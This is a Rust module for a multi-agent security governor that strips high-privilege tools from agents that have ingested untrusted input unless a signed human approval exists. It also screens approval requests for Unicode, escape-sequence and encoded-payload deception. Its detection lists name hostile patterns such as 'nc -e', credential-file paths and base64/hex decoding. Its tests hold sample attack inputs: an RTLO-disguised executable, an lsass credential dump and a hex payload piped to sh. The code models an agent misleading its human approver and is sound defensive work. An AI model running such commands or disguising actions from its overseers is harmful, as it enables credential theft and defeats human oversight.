//! # Multi-Agent Mesh Capability Governor & Confused-Deputy Defense (F07 / F08 / F29 / F30)
//!
//! Enforces taint-aware capability stripping across inter-arm mesh transitions (`F07`, `F08`)
//! and protects Human-in-the-Loop (HITL) operators against semantic social engineering,
//! UTS #39 homograph/RTLO attacks, and approval fatigue via `HitlCognitiveFirewall` (`F29`, `F30`).

use dashmap::DashMap;
use hmac::{Hmac, Mac};
use osoosi_types::{OctopusSecurityError, TrustTier};
use serde::{Deserialize, Serialize};
use sha2::Sha256;
use std::collections::HashSet;
use std::sync::Arc;
use subtle::ConstantTimeEq;

type HmacSha256 = Hmac<Sha256>;

/// High-privilege tools that must be stripped when an arm ingests `UntrustedExternal` taint
/// without explicit operator HITL approval.
pub const HIGH_PRIVILEGE_MESH_TOOLS: &[&str] = &[
    "shell_exec",
    "cmd",
    "powershell",
    "write_file",
    "network_egress",
    "extract_credentials",
    "modify_policy",
    "ledger_writer",
];

/// Taint classification for inter-arm mesh payloads.
#[derive(
    Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Hash, Serialize, Deserialize, Default,
)]
pub enum MeshTaintLevel {
    #[default]
    TrustedInternal = 0,
    Suspect = 1,
    UntrustedExternal = 2,
    Quarantined = 3,
}

impl MeshTaintLevel {
    pub fn requires_capability_stripping(self) -> bool {
        matches!(self, Self::UntrustedExternal | Self::Quarantined)
    }
}

/// Cryptographically signed Human-in-the-Loop (HITL) operator approval receipt.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct HitlApprovalReceipt {
    pub receipt_id: String,
    pub operator_id: String,
    pub target_arm_id: usize,
    pub target_epoch: u64,
    pub correlation_id: String,
    pub approved_tools: Vec<String>,
    pub issued_at_secs: u64,
    pub expires_at_secs: u64,
    pub signature_hex: String,
}

impl HitlApprovalReceipt {
    #[allow(clippy::too_many_arguments)]
    pub fn sign(
        receipt_id: &str,
        operator_id: &str,
        target_arm_id: usize,
        target_epoch: u64,
        correlation_id: &str,
        approved_tools: Vec<String>,
        issued_at_secs: u64,
        expires_at_secs: u64,
        operator_secret: &[u8],
    ) -> Self {
        let mut sorted_tools = approved_tools;
        sorted_tools.sort();
        let canonical = Self::canonical_signing_string(
            receipt_id,
            operator_id,
            target_arm_id,
            target_epoch,
            correlation_id,
            &sorted_tools,
            issued_at_secs,
            expires_at_secs,
        );
        let mut mac = HmacSha256::new_from_slice(operator_secret)
            .expect("HMAC-SHA256 accepts arbitrary key length");
        mac.update(canonical.as_bytes());
        let sig_hex = hex::encode(mac.finalize().into_bytes());
        Self {
            receipt_id: receipt_id.to_string(),
            operator_id: operator_id.to_string(),
            target_arm_id,
            target_epoch,
            correlation_id: correlation_id.to_string(),
            approved_tools: sorted_tools,
            issued_at_secs,
            expires_at_secs,
            signature_hex: sig_hex,
        }
    }

    #[allow(clippy::too_many_arguments)]
    pub fn canonical_signing_string(
        receipt_id: &str,
        operator_id: &str,
        target_arm_id: usize,
        target_epoch: u64,
        correlation_id: &str,
        approved_tools: &[String],
        issued_at_secs: u64,
        expires_at_secs: u64,
    ) -> String {
        format!(
            "hitl:{}:{}:{}:{}:{}:{}:{}:{}",
            receipt_id,
            operator_id,
            target_arm_id,
            target_epoch,
            correlation_id,
            approved_tools.join(","),
            issued_at_secs,
            expires_at_secs
        )
    }

    pub fn verify(
        &self,
        expected_arm_id: usize,
        expected_epoch: u64,
        expected_correlation_id: &str,
        now_secs: u64,
        operator_secret: &[u8],
    ) -> Result<(), OctopusSecurityError> {
        if self.target_arm_id != expected_arm_id {
            return Err(OctopusSecurityError::CapabilityDenied(format!(
                "HITL receipt target_arm_id {} != receiver arm_id {}",
                self.target_arm_id, expected_arm_id
            )));
        }
        if self.target_epoch != expected_epoch {
            return Err(OctopusSecurityError::CapabilityDenied(format!(
                "HITL receipt epoch {} != active arm epoch {}",
                self.target_epoch, expected_epoch
            )));
        }
        if self.correlation_id != expected_correlation_id {
            return Err(OctopusSecurityError::CapabilityDenied(format!(
                "HITL receipt correlation_id '{}' != message correlation_id '{}'",
                self.correlation_id, expected_correlation_id
            )));
        }
        if now_secs > self.expires_at_secs {
            return Err(OctopusSecurityError::CapabilityDenied(format!(
                "HITL receipt '{}' expired at {} (now={})",
                self.receipt_id, self.expires_at_secs, now_secs
            )));
        }
        let mut sorted_tools = self.approved_tools.clone();
        sorted_tools.sort();
        let canonical = Self::canonical_signing_string(
            &self.receipt_id,
            &self.operator_id,
            self.target_arm_id,
            self.target_epoch,
            &self.correlation_id,
            &sorted_tools,
            self.issued_at_secs,
            self.expires_at_secs,
        );
        let mut mac = HmacSha256::new_from_slice(operator_secret)
            .expect("HMAC-SHA256 accepts arbitrary key length");
        mac.update(canonical.as_bytes());
        let expected_hex = hex::encode(mac.finalize().into_bytes());
        if self.signature_hex.len() != expected_hex.len()
            || !bool::from(self.signature_hex.as_bytes().ct_eq(expected_hex.as_bytes()))
        {
            return Err(OctopusSecurityError::IdentitySpoofingDetected(
                "Invalid HMAC-SHA256 signature on HitlApprovalReceipt".to_string(),
            ));
        }
        Ok(())
    }
}

/// Result of governing an arm's downstream tool capabilities after receiving a mesh message.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct CapabilityGovernanceVerdict {
    pub arm_id: usize,
    pub effective_taint: MeshTaintLevel,
    pub allowed_tools: HashSet<String>,
    pub stripped_tools: HashSet<String>,
    pub hitl_override_verified: bool,
}

/// Runtime governor that strips high-privilege tools from arms tainted by `UntrustedExternal`
/// mesh messages unless a valid `HitlApprovalReceipt` is verified.
#[derive(Clone)]
pub struct MeshCapabilityGovernor {
    operator_secret: [u8; 32],
    arm_taint: Arc<DashMap<usize, MeshTaintLevel>>,
    arm_allowed_tools: Arc<DashMap<usize, HashSet<String>>>,
}

impl MeshCapabilityGovernor {
    pub fn new(operator_secret: [u8; 32]) -> Self {
        Self {
            operator_secret,
            arm_taint: Arc::new(DashMap::new()),
            arm_allowed_tools: Arc::new(DashMap::new()),
        }
    }

    pub fn register_arm_tools(&self, arm_id: usize, initial_tools: HashSet<String>) {
        self.arm_taint
            .insert(arm_id, MeshTaintLevel::TrustedInternal);
        self.arm_allowed_tools.insert(arm_id, initial_tools);
    }

    /// Evaluates incoming taint and strips high-privilege tools downstream unless a valid
    /// operator `HitlApprovalReceipt` is supplied and verified.
    #[allow(clippy::too_many_arguments)]
    pub fn govern_arm_capabilities_on_ingress(
        &self,
        arm_id: usize,
        active_epoch: u64,
        correlation_id: &str,
        incoming_taint: MeshTaintLevel,
        incoming_trust_floor: TrustTier,
        hitl_receipt: Option<&HitlApprovalReceipt>,
        now_secs: u64,
    ) -> Result<CapabilityGovernanceVerdict, OctopusSecurityError> {
        let effective_incoming = if incoming_trust_floor == TrustTier::Untrusted
            && incoming_taint < MeshTaintLevel::UntrustedExternal
        {
            MeshTaintLevel::UntrustedExternal
        } else {
            incoming_taint
        };

        let current_taint = self
            .arm_taint
            .get(&arm_id)
            .map(|v| *v)
            .unwrap_or(MeshTaintLevel::TrustedInternal);
        let merged_taint = current_taint.max(effective_incoming);
        self.arm_taint.insert(arm_id, merged_taint);

        let mut hitl_verified = false;
        let mut hitl_permitted: HashSet<String> = HashSet::new();
        if let Some(receipt) = hitl_receipt {
            receipt.verify(
                arm_id,
                active_epoch,
                correlation_id,
                now_secs,
                &self.operator_secret,
            )?;
            hitl_verified = true;
            for t in &receipt.approved_tools {
                hitl_permitted.insert(t.clone());
            }
        }

        let mut stripped_tools = HashSet::new();
        let mut allowed_tools = self
            .arm_allowed_tools
            .get(&arm_id)
            .map(|v| v.clone())
            .unwrap_or_default();

        if merged_taint.requires_capability_stripping() {
            for priv_tool in HIGH_PRIVILEGE_MESH_TOOLS {
                let keep_via_hitl = hitl_verified && hitl_permitted.contains(*priv_tool);
                if !keep_via_hitl && allowed_tools.remove(*priv_tool) {
                    stripped_tools.insert((*priv_tool).to_string());
                }
            }
        }

        self.arm_allowed_tools.insert(arm_id, allowed_tools.clone());

        Ok(CapabilityGovernanceVerdict {
            arm_id,
            effective_taint: merged_taint,
            allowed_tools,
            stripped_tools,
            hitl_override_verified: hitl_verified,
        })
    }

    /// Checks whether a downstream tool call is permitted on `arm_id` under its current mesh taint.
    pub fn authorize_downstream_tool(
        &self,
        arm_id: usize,
        tool_name: &str,
    ) -> Result<(), OctopusSecurityError> {
        let norm = tool_name.trim().to_ascii_lowercase();
        let taint = self
            .arm_taint
            .get(&arm_id)
            .map(|v| *v)
            .unwrap_or(MeshTaintLevel::TrustedInternal);

        if let Some(allowed) = self.arm_allowed_tools.get(&arm_id) {
            if !allowed.contains(tool_name) && !allowed.contains(&norm) {
                return Err(OctopusSecurityError::CapabilityDenied(format!(
                    "MESH_TAINT_CAPABILITY_STRIPPED: Arm {} (taint {:?}) is barred from executing high-privilege or unauthorized tool '{}'",
                    arm_id, taint, tool_name
                )));
            }
            return Ok(());
        }

        if taint.requires_capability_stripping()
            && HIGH_PRIVILEGE_MESH_TOOLS.iter().any(|t| *t == norm)
        {
            return Err(OctopusSecurityError::CapabilityDenied(format!(
                "MESH_TAINT_CAPABILITY_STRIPPED: Arm {} (taint {:?}) is barred from executing high-privilege tool '{}'",
                arm_id, taint, tool_name
            )));
        }

        Ok(())
    }
}

// ============================================================================
// F29 & F30: HitlCognitiveFirewall — UTS #39 Homograph/RTLO Scanner &
// Intent-vs-Effect Semantic Divergence Gate (arXiv:2509.12626 & arXiv:2606.09832)
// ============================================================================

/// Specific visual or syntactic deception indicators detected on a HITL escalation card (`F29`).
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub enum HitlDeceptionIndicator {
    /// Bidirectional override characters (`U+202A`..`U+202E`, `U+2066`..`U+2069`) such as `RTLO` (`U+202E`)
    /// used to disguise `.exe` / `.ps1` extensions as benign `.txt` / `.jpg` files.
    BidirectionalOverrideRtlo(String),
    /// Zero-width characters (`U+200B`, `U+200C`, `U+200D`, `U+FEFF`) used to split forbidden tokens.
    ZeroWidthSteganography(String),
    /// UTS #39 mixed-script Cyrillic/Greek confusable homographs mixed with ASCII characters.
    UnicodeConfusableHomograph(String),
    /// ANSI / VT100 terminal escape sequences (`\x1b[`) attempting to overwrite terminal/UI text.
    AnsiEscapeInjection(String),
    /// Base64 or hex-encoded shell execution payload (`-enc`, `FromBase64String`, `base64 -d`).
    ObfuscatedShellPayload(String),
    /// Severe semantic contradiction between a benign user objective and a high-risk OS capability effect.
    IntentEffectContradiction(String),
}

/// Deterministic OS capability blast-radius summary extracted independently of the LLM's justification (`F29`).
#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
pub struct DecompiledBlastRadius {
    pub canonical_tool: String,
    pub canonical_target_resource: String,
    pub privilege_tier: String,
    pub taint_lineage_summary: String,
    pub deception_indicators: Vec<HitlDeceptionIndicator>,
    pub divergence_score: f64,
}

/// Outcome of the `HitlCognitiveFirewall` evaluation (`F30`).
#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
pub enum HitlFirewallDecision {
    /// Low divergence ($D_{\text{hitl}} < 0.45$) and zero deception indicators: standard HITL approval allowed.
    StandardHitlAllowed { blast_radius: DecompiledBlastRadius },
    /// Elevated social-engineering risk ($0.45 \le D_{\text{hitl}} < 0.85$): one-click Approve is disabled;
    /// operator must type the exact `expected_confirmation_token` after reviewing the blast-radius diff.
    RequireTypedBlastRadiusChallenge {
        blast_radius: DecompiledBlastRadius,
        expected_confirmation_token: String,
    },
    /// Critical deception or intent-effect contradiction ($D_{\text{hitl}} \ge 0.85$): auto-vetoed and blocked
    /// before any approval UI is even clickable by the human operator.
    AutoVetoDeceptive {
        blast_radius: DecompiledBlastRadius,
        veto_reason: String,
    },
}

/// Cognitive Firewall protecting Human-in-the-Loop (HITL) operators against semantic social engineering,
/// UI redressing, homograph paths, and approval fatigue (`F29` & `F30`).
pub struct HitlCognitiveFirewall;

impl HitlCognitiveFirewall {
    /// Scans a string for UTS #39 Unicode confusables, bidirectional overrides (`RTLO`),
    /// zero-width characters, ANSI escapes, and encoded shell payloads (`F29`).
    pub fn scan_for_visual_deception(input: &str) -> Vec<HitlDeceptionIndicator> {
        let mut findings = Vec::new();

        // 1. Bidirectional overrides (U+202A..=U+202E, U+2066..=U+2069)
        if input.chars().any(|c| {
            matches!(
                c,
                '\u{202A}'..='\u{202E}' | '\u{2066}'..='\u{2069}' | '\u{200E}' | '\u{200F}'
            )
        }) {
            findings.push(HitlDeceptionIndicator::BidirectionalOverrideRtlo(
                "Detected Unicode Bidi Override (RTLO U+202E / LRO) disguising path or argument order"
                    .to_string(),
            ));
        }

        // 2. Zero-width characters & soft hyphens (U+00AD, U+200B..=U+200D, U+FEFF, U+2060, U+180E)
        if input.chars().any(|c| {
            matches!(
                c,
                '\u{00AD}' | '\u{200B}'..='\u{200D}' | '\u{FEFF}' | '\u{2060}' | '\u{180E}'
            )
        }) {
            findings.push(HitlDeceptionIndicator::ZeroWidthSteganography(
                "Detected invisible zero-width or soft-hyphen characters splitting command tokens"
                    .to_string(),
            ));
        }

        // 3. UTS #39 mixed-script Cyrillic/Greek confusable homographs mixed with ASCII letters or isolated lookalikes
        let has_ascii_alpha = input.chars().any(|c| c.is_ascii_alphabetic());
        let has_confusable_script = input.chars().any(|c| {
            let u = c as u32;
            (0x0400..=0x04FF).contains(&u) || (0x0370..=0x03FF).contains(&u)
        });
        let has_latin_confusable = input.chars().any(|c| {
            matches!(
                c,
                // Cyrillic lookalikes
                '\u{0430}' | '\u{0441}' | '\u{0435}' | '\u{043E}' | '\u{0440}' | '\u{0405}' |
                '\u{0445}' | '\u{0443}' | '\u{0456}' | '\u{0458}' | '\u{0410}' | '\u{0412}' |
                '\u{0421}' | '\u{0415}' | '\u{041D}' | '\u{041E}' | '\u{0420}' | '\u{0422}' | '\u{0425}' |
                // Greek lookalikes
                '\u{03B1}' | '\u{03B2}' | '\u{03B5}' | '\u{03B9}' | '\u{03BA}' | '\u{03BF}' |
                '\u{03C1}' | '\u{03C4}' | '\u{03C5}' | '\u{03C7}' | '\u{0391}' | '\u{0392}' |
                '\u{0395}' | '\u{0397}' | '\u{0399}' | '\u{039A}' | '\u{039C}' | '\u{039D}' |
                '\u{039F}' | '\u{03A1}' | '\u{03A4}' | '\u{03A7}'
            )
        });
        if (has_ascii_alpha && has_confusable_script) || has_latin_confusable {
            findings.push(HitlDeceptionIndicator::UnicodeConfusableHomograph(
                "Detected UTS #39 mixed-script ASCII + Cyrillic/Greek homograph lookalike characters"
                    .to_string(),
            ));
        }

        // 4. ANSI / CSI terminal escape sequences (\x1b[ or \u{009b})
        if input.contains('\x1b') || input.contains('\u{009b}') {
            findings.push(HitlDeceptionIndicator::AnsiEscapeInjection(
                "Detected ANSI/VT100 terminal escape sequence in HITL display field".to_string(),
            ));
        }

        // 5. Base64 / Hex obfuscated shell payloads
        let lower = input.to_ascii_lowercase();
        let has_hex_payload = lower.contains("certutil -decodehex")
            || lower.contains("certutil.exe -decodehex")
            || lower.contains("fromhexstring")
            || lower.contains("xxd -r")
            || lower.contains("xxd -p")
            || lower.contains("base64 --decode")
            || lower.contains("base64 -d")
            || lower.contains(" -e ")
            || lower.contains(" /e ")
            || (lower.contains("\\x") && lower.matches("\\x").count() >= 4)
            || (lower.contains("0x") && lower.matches("0x").count() >= 4);

        if lower.contains("-enc ")
            || lower.contains("-encodedcommand")
            || lower.contains("frombase64string")
            || lower.contains("| base64 -d")
            || lower.contains("|base64 -d")
            || lower.contains("eval(atob(")
            || has_hex_payload
        {
            findings.push(HitlDeceptionIndicator::ObfuscatedShellPayload(
                "Detected base64/hex encoded shell payload hiding true command effect from human reviewer"
                    .to_string(),
            ));
        }

        findings
    }

    /// Deterministically derives the expected typed confirmation token for friction-proportional
    /// HITL challenges (`CONFIRM:<TOOL>:<BASENAME>`).
    pub fn expected_blast_radius_token(tool_name: &str, canonical_resource: &str) -> String {
        let clean_tool = tool_name.trim().to_ascii_uppercase();
        let basename = canonical_resource
            .trim()
            .trim_end_matches(['/', '\\'])
            .rsplit(['/', '\\'])
            .next()
            .unwrap_or(canonical_resource.trim())
            .chars()
            .filter(|c| c.is_ascii_alphanumeric() || matches!(c, '.' | '_' | '-' | ':'))
            .collect::<String>();
        let target_part = if basename.is_empty() {
            "RESOURCE".to_string()
        } else {
            basename.to_ascii_uppercase()
        };
        format!("CONFIRM:{}:{}", clean_tool, target_part)
    }

    /// Evaluates a candidate HITL escalation by deterministically decompiling the OS capability blast radius,
    /// scanning for UTS #39 visual deception (`F29`), and computing the Intent-vs-Effect Semantic Divergence
    /// Score $D_{\text{hitl}} \in [0.0, 1.0]$ (`F30`).
    pub fn evaluate_hitl_escalation(
        user_objective: &str,
        agent_justification: &str,
        tool_name: &str,
        canonical_target_resource: &str,
        command_args: &str,
        incoming_taint: MeshTaintLevel,
    ) -> HitlFirewallDecision {
        let norm_tool = tool_name.trim().to_ascii_lowercase();
        let combined_scan = format!(
            "{}\n{}\n{}\n{}",
            agent_justification, tool_name, canonical_target_resource, command_args
        );
        let mut indicators = Self::scan_for_visual_deception(&combined_scan);

        let is_high_priv = HIGH_PRIVILEGE_MESH_TOOLS.iter().any(|t| *t == norm_tool);
        let privilege_tier = if is_high_priv {
            "CRITICAL_HOST_MUTATION_OR_EXEC"
        } else {
            "STANDARD_READ_OR_ANALYSIS"
        };

        let mut score: f64 = 0.0;

        // Visual / syntactic deception immediately pushes divergence >= 0.90 (Auto-Veto)
        for ind in &indicators {
            match ind {
                HitlDeceptionIndicator::BidirectionalOverrideRtlo(_) => score += 0.95,
                HitlDeceptionIndicator::UnicodeConfusableHomograph(_) => score += 0.90,
                HitlDeceptionIndicator::ObfuscatedShellPayload(_) => score += 0.90,
                HitlDeceptionIndicator::ZeroWidthSteganography(_) => score += 0.85,
                HitlDeceptionIndicator::AnsiEscapeInjection(_) => score += 0.85,
                HitlDeceptionIndicator::IntentEffectContradiction(_) => score += 0.50,
            }
        }

        // Semantic Intent-vs-Effect divergence check
        let obj_lc = format!("{} {}", user_objective, agent_justification).to_ascii_lowercase();
        let effect_lc = format!(
            "{} {} {}",
            norm_tool, canonical_target_resource, command_args
        )
        .to_ascii_lowercase();

        let claims_benign_readonly = obj_lc.contains("format")
            || obj_lc.contains("lint")
            || obj_lc.contains("read doc")
            || obj_lc.contains("summarize")
            || obj_lc.contains("check typo")
            || obj_lc.contains("view status");

        let touches_sensitive_or_destructive_sink = norm_tool == "extract_credentials"
            || norm_tool == "modify_policy"
            || norm_tool == "ledger_writer"
            || effect_lc.contains("lsass")
            || effect_lc.contains("sam")
            || effect_lc.contains(".ssh")
            || effect_lc.contains("id_rsa")
            || effect_lc.contains("osoosi.toml")
            || effect_lc.contains("osoosi.db")
            || effect_lc.contains("curl ")
            || effect_lc.contains("invoke-webrequest")
            || effect_lc.contains("nc -e")
            || effect_lc.contains("authorized_keys");

        if claims_benign_readonly && touches_sensitive_or_destructive_sink {
            indicators.push(HitlDeceptionIndicator::IntentEffectContradiction(format!(
                "Stated benign read/format objective '{}' contradicts sensitive capability effect on '{}'",
                user_objective.trim(),
                canonical_target_resource.trim()
            )));
            score += 0.90;
        } else if claims_benign_readonly && is_high_priv {
            indicators.push(HitlDeceptionIndicator::IntentEffectContradiction(format!(
                "Read-only objective '{}' escalated to high-privilege tool '{}'",
                user_objective.trim(),
                norm_tool
            )));
            score += 0.55;
        }

        if incoming_taint.requires_capability_stripping() && is_high_priv {
            score += 0.50;
        } else if incoming_taint == MeshTaintLevel::Suspect && is_high_priv {
            score += 0.30;
        }

        let divergence_score = score.clamp(0.0, 1.0);
        let blast_radius = DecompiledBlastRadius {
            canonical_tool: norm_tool.clone(),
            canonical_target_resource: canonical_target_resource.trim().to_string(),
            privilege_tier: privilege_tier.to_string(),
            taint_lineage_summary: format!("MeshTaint::{:?}", incoming_taint),
            deception_indicators: indicators,
            divergence_score,
        };

        if divergence_score >= 0.85 {
            HitlFirewallDecision::AutoVetoDeceptive {
                veto_reason: format!(
                    "HITL_COGNITIVE_FIREWALL_AUTO_VETO: divergence_score={:.2} >= 0.85 on tool '{}' targeting '{}'",
                    divergence_score, norm_tool, canonical_target_resource
                ),
                blast_radius,
            }
        } else if divergence_score >= 0.45 {
            let expected_confirmation_token =
                Self::expected_blast_radius_token(&norm_tool, canonical_target_resource);
            HitlFirewallDecision::RequireTypedBlastRadiusChallenge {
                blast_radius,
                expected_confirmation_token,
            }
        } else {
            HitlFirewallDecision::StandardHitlAllowed { blast_radius }
        }
    }

    /// Verifies that an operator completed the Friction-Proportional Typed Blast-Radius Challenge (`F30`)
    /// when $0.45 \le D_{\text{hitl}} < 0.85$, or rejects immediately if $D_{\text{hitl}} \ge 0.85$.
    pub fn verify_typed_blast_radius_challenge(
        decision: &HitlFirewallDecision,
        operator_typed_token: Option<&str>,
    ) -> Result<(), OctopusSecurityError> {
        match decision {
            HitlFirewallDecision::StandardHitlAllowed { .. } => Ok(()),
            HitlFirewallDecision::AutoVetoDeceptive { veto_reason, .. } => {
                Err(OctopusSecurityError::CapabilityDenied(veto_reason.clone()))
            }
            HitlFirewallDecision::RequireTypedBlastRadiusChallenge {
                expected_confirmation_token,
                blast_radius,
            } => {
                let supplied = operator_typed_token.unwrap_or("").trim();
                if supplied != expected_confirmation_token {
                    return Err(OctopusSecurityError::CapabilityDenied(format!(
                        "HITL_ANTI_FATIGUE_CHALLENGE_FAILED: High-risk action (D_hitl={:.2}) requires typing exact confirmation token '{}' (got '{}')",
                        blast_radius.divergence_score, expected_confirmation_token, supplied
                    )));
                }
                Ok(())
            }
        }
    }

    /// Evaluates a HITL approval card by inspecting BOTH summary and raw_command for
    /// Unicode zero-width characters, RTLO, ANSI escapes, and confusable homographs.
    pub fn evaluate_hitl_card(summary: &str, raw_command: &str) -> HitlCardEvaluation {
        let is_zero_width = |c: char| {
            matches!(
                c,
                '\u{00AD}' | '\u{200B}'..='\u{200D}' | '\u{FEFF}' | '\u{2060}' | '\u{180E}'
            )
        };
        let is_rtlo = |c: char| {
            matches!(
                c,
                '\u{202A}'..='\u{202E}' | '\u{2066}'..='\u{2069}' | '\u{200E}' | '\u{200F}'
            )
        };

        let has_rtlo = summary.chars().any(is_rtlo) || raw_command.chars().any(is_rtlo);
        let has_zero_width =
            summary.chars().any(is_zero_width) || raw_command.chars().any(is_zero_width);
        let has_ansi_escape = summary.contains('\x1b')
            || summary.contains('\u{009b}')
            || raw_command.contains('\x1b')
            || raw_command.contains('\u{009b}');

        let summary_indicators = Self::scan_for_visual_deception(summary);
        let cmd_indicators = Self::scan_for_visual_deception(raw_command);
        let has_confusable = summary_indicators
            .iter()
            .any(|i| matches!(i, HitlDeceptionIndicator::UnicodeConfusableHomograph(_)))
            || cmd_indicators
                .iter()
                .any(|i| matches!(i, HitlDeceptionIndicator::UnicodeConfusableHomograph(_)));

        let mut indicators = summary_indicators;
        for ind in cmd_indicators {
            if !indicators.contains(&ind) {
                indicators.push(ind);
            }
        }

        let is_deceptive = has_rtlo
            || has_zero_width
            || has_ansi_escape
            || has_confusable
            || !indicators.is_empty();
        let recommended_action = if is_deceptive {
            "AUTO_VETO_BLOCK"
        } else {
            "PERMIT_REVIEW"
        };

        HitlCardEvaluation {
            is_deceptive,
            has_rtlo,
            has_zero_width,
            has_ansi_escape,
            has_confusable_homograph: has_confusable,
            indicators,
            recommended_action,
        }
    }
}

/// Evaluation result for a HITL approval card.
#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
pub struct HitlCardEvaluation {
    pub is_deceptive: bool,
    pub has_rtlo: bool,
    pub has_zero_width: bool,
    pub has_ansi_escape: bool,
    pub has_confusable_homograph: bool,
    pub indicators: Vec<HitlDeceptionIndicator>,
    pub recommended_action: &'static str,
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_untrusted_external_strips_high_privilege_tools_without_hitl() {
        let secret = [0x42u8; 32];
        let gov = MeshCapabilityGovernor::new(secret);
        let initial: HashSet<String> = [
            "shell_exec",
            "write_file",
            "network_egress",
            "doc_extractor",
            "anomaly_evaluator",
        ]
        .into_iter()
        .map(String::from)
        .collect();
        gov.register_arm_tools(2, initial);

        let verdict = gov
            .govern_arm_capabilities_on_ingress(
                2,
                1,
                "corr-101",
                MeshTaintLevel::UntrustedExternal,
                TrustTier::Untrusted,
                None,
                1_700_000_000,
            )
            .expect("governance succeeds");

        assert_eq!(verdict.effective_taint, MeshTaintLevel::UntrustedExternal);
        assert!(verdict.stripped_tools.contains("shell_exec"));
        assert!(verdict.stripped_tools.contains("write_file"));
        assert!(verdict.stripped_tools.contains("network_egress"));
        assert!(verdict.allowed_tools.contains("doc_extractor"));
        assert!(gov.authorize_downstream_tool(2, "shell_exec").is_err());
        assert!(gov.authorize_downstream_tool(2, "doc_extractor").is_ok());
    }

    #[test]
    fn test_valid_hitl_receipt_preserves_approved_tool() {
        let secret = [0x55u8; 32];
        let gov = MeshCapabilityGovernor::new(secret);
        let initial: HashSet<String> = ["write_file", "shell_exec", "doc_extractor"]
            .into_iter()
            .map(String::from)
            .collect();
        gov.register_arm_tools(3, initial);

        let receipt = HitlApprovalReceipt::sign(
            "rcpt-1",
            "secops-admin",
            3,
            7,
            "corr-hitl",
            vec!["write_file".to_string()],
            1_700_000_000,
            1_700_000_300,
            &secret,
        );

        let verdict = gov
            .govern_arm_capabilities_on_ingress(
                3,
                7,
                "corr-hitl",
                MeshTaintLevel::UntrustedExternal,
                TrustTier::Untrusted,
                Some(&receipt),
                1_700_000_100,
            )
            .expect("valid HITL receipt accepted");

        assert!(verdict.hitl_override_verified);
        assert!(verdict.allowed_tools.contains("write_file"));
        assert!(verdict.stripped_tools.contains("shell_exec"));
        assert!(gov.authorize_downstream_tool(3, "write_file").is_ok());
        assert!(gov.authorize_downstream_tool(3, "shell_exec").is_err());
    }

    #[test]
    fn test_hitl_cognitive_firewall_auto_vetoes_rtlo_and_homograph_deception() {
        // RTLO (U+202E) disguising an executable as a text file
        let rtlo_path = "C:\\workspace\\report_\u{202E}txt.exe";
        let decision = HitlCognitiveFirewall::evaluate_hitl_escalation(
            "Generate project summary report",
            "Saving harmless report text file",
            "shell_exec",
            rtlo_path,
            "",
            MeshTaintLevel::TrustedInternal,
        );
        match &decision {
            HitlFirewallDecision::AutoVetoDeceptive { blast_radius, .. } => {
                assert!(blast_radius.divergence_score >= 0.85);
                assert!(blast_radius
                    .deception_indicators
                    .iter()
                    .any(|i| matches!(i, HitlDeceptionIndicator::BidirectionalOverrideRtlo(_))));
            }
            other => panic!("Expected AutoVetoDeceptive for RTLO, got {:?}", other),
        }
        assert!(HitlCognitiveFirewall::verify_typed_blast_radius_challenge(
            &decision,
            Some("CONFIRM:SHELL_EXEC:REPORT_TXT.EXE")
        )
        .is_err());

        // Cyrillic 'а' (\u{0430}) mixed with ASCII in path
        let homograph_path = "C:\\Users\\admin\\.ssh\\authorized_k\u{0435}ys";
        let homograph_decision = HitlCognitiveFirewall::evaluate_hitl_escalation(
            "Update config",
            "Writing standard workspace preference",
            "write_file",
            homograph_path,
            "ssh-ed25519 AAAA...",
            MeshTaintLevel::TrustedInternal,
        );
        assert!(matches!(
            homograph_decision,
            HitlFirewallDecision::AutoVetoDeceptive { .. }
        ));
    }

    #[test]
    fn test_hitl_cognitive_firewall_semantic_divergence_and_typed_challenge() {
        // 1. Severe intent-vs-effect contradiction (D_hitl >= 0.85 -> AutoVeto)
        let contradiction = HitlCognitiveFirewall::evaluate_hitl_escalation(
            "Format Rust code and check typos in README",
            "Running formatter on workspace",
            "extract_credentials",
            "C:\\Windows\\System32\\lsass.exe",
            "--dump",
            MeshTaintLevel::UntrustedExternal,
        );
        assert!(matches!(
            contradiction,
            HitlFirewallDecision::AutoVetoDeceptive { .. }
        ));

        // 2. Elevated risk (0.45 <= D_hitl < 0.85 -> RequireTypedBlastRadiusChallenge)
        let challenge = HitlCognitiveFirewall::evaluate_hitl_escalation(
            "Build and deploy release package",
            "Writing build output configuration",
            "write_file",
            "C:\\workspace\\deploy\\release_manifest.json",
            "{}",
            MeshTaintLevel::UntrustedExternal,
        );
        match &challenge {
            HitlFirewallDecision::RequireTypedBlastRadiusChallenge {
                expected_confirmation_token,
                blast_radius,
            } => {
                assert!(
                    blast_radius.divergence_score >= 0.45 && blast_radius.divergence_score < 0.85
                );
                assert_eq!(
                    expected_confirmation_token,
                    "CONFIRM:WRITE_FILE:RELEASE_MANIFEST.JSON"
                );
                // Blank or wrong token fails anti-fatigue gate
                assert!(HitlCognitiveFirewall::verify_typed_blast_radius_challenge(
                    &challenge,
                    Some("approve")
                )
                .is_err());
                // Exact typed blast-radius token succeeds
                assert!(HitlCognitiveFirewall::verify_typed_blast_radius_challenge(
                    &challenge,
                    Some("CONFIRM:WRITE_FILE:RELEASE_MANIFEST.JSON")
                )
                .is_ok());
            }
            other => panic!("Expected RequireTypedBlastRadiusChallenge, got {:?}", other),
        }
    }

    #[test]
    fn test_hitl_cognitive_firewall_hex_payload_detection() {
        let certutil_cmd = "certutil -decodehex in.hex out.exe";
        let certutil_indicators = HitlCognitiveFirewall::scan_for_visual_deception(certutil_cmd);
        assert!(certutil_indicators
            .iter()
            .any(|i| matches!(i, HitlDeceptionIndicator::ObfuscatedShellPayload(_))));

        let fromhex_cmd = "powershell -c [Convert]::FromHexString('4d5a9000')";
        let fromhex_indicators = HitlCognitiveFirewall::scan_for_visual_deception(fromhex_cmd);
        assert!(fromhex_indicators
            .iter()
            .any(|i| matches!(i, HitlDeceptionIndicator::ObfuscatedShellPayload(_))));

        let xxd_cmd = "cat payload.hex | xxd -r -p | sh";
        let xxd_indicators = HitlCognitiveFirewall::scan_for_visual_deception(xxd_cmd);
        assert!(xxd_indicators
            .iter()
